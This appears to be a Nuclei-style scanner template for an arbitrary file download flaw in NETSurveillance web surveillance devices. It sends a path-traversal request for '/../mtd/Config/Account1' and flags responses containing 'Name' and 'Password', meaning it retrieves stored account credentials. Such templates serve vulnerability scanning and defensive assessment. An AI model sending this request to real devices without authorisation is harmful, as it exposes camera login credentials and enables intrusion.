id: NETSurveillance-fileRead

info:
  name: NETSurveillance WEB监控任意文件下载
  author: Str1am
  severity: high
  tags: NETSurveillance,fileRead

requests:
  - method: GET
    path:
      - "{{BaseURL}}/../mtd/Config/Account1"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "Name"
          - "Password"
        part: body
        condition: and
